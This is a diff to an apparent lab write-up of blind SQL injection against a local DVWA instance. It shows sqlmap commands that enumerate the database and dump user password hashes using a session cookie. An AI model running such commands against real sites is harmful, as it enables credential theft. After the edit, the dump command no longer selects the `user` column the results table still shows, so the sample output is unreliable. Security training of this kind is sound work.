@@ -76,8 +76,7 @@ Once the injectable parameter was confirmed manually, SQLMap was used to automat
 ```bash
 sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
        --cookie="PHPSESSID=<your_session_id>; security=low" \
-       --dbs \
-       --batch
+       --dbs
 ```
 
 **Discovered:**
@@ -93,8 +92,7 @@ sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
 sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
        --cookie="PHPSESSID=<your_session_id>; security=low" \
        -D dvwa \
-       --tables \
-       --batch
+       --tables
 ```
 
 **Discovered:**
@@ -110,14 +108,12 @@ sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
 sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
        --cookie="PHPSESSID=<your_session_id>; security=low" \
        -D dvwa -T users \
-       --columns \
-       --batch
+       --columns
 ```
 
 **Columns of interest:**
 ```
 [*] user_id
-[*] user
 [*] password
 ```
 
@@ -128,14 +124,13 @@ sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
 sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
        --cookie="PHPSESSID=<your_session_id>; security=low" \
        -D dvwa -T users \
-       -C user_id,user,password \
-       --dump \
-       --batch
+       -C user_id,password \
+       --dump
 ```
 
 **SQLMap identified MD5 hashes and cracked them via built-in dictionary.**
 
-**Results (replace with your actual output):**
+**Results (sample output):**
 
 | user_id | user    | password (MD5 hash)              | plaintext |
 |---------|---------|----------------------------------|-----------|
@@ -151,6 +146,5 @@ sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
 
 - The `id` parameter accepts user-supplied input with no sanitization or type validation
 - The application's true/false response difference is clearly visible, making boolean-based blind SQLi trivial to confirm manually
-- SQLMap's `--batch` flag automates all prompts — in a real engagement you would review each prompt manually
 - MD5 without a salt is effectively broken for password storage — rainbow table and dictionary attacks are near-instant
 - Replacing `<your_session_id>` with a live PHPSESSID from an authenticated browser session is required for SQLMap to access the protected endpoint
